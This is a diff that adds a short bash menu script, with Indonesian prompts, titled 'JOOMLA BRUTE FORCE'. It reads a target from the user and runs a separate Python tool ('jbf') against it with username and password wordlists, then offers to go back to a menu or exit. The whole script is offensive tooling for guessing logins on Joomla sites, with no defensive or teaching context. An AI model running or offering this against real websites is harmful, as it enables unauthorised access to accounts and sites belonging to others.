@@ -1,0 +1,40 @@
+#!/bin/bash
+clear
+clear
+
+echo "
+          \033[32;1m..::|[ JOOMLA BRUTE FORCE ]|::..\033[0m "
+echo "
+
+
+
+
+
+
+
+
+"
+echo -n "\033[32;1mMasukan Target: \033[0m "
+read trgt
+
+cd ../xx/
+
+python2 jbf -h $trgt -U ../wodlis/usernames.lst -P ../wodlis/passwords.lst
+
+
+echo "
+=> Tekan \033[33mB\033[0m untuk kembali
+=> Tekan \033[31mK\033[0m untuk keluar"
+echo -n "=> Pilihan: "
+read upil
+if [ $upil = b ] || [ $upil = B ]
+then
+clear
+sh start
+fi
+
+if [ $upil = k ] || [ $upil = K ]
+then
+clear
+sh exit
+fi
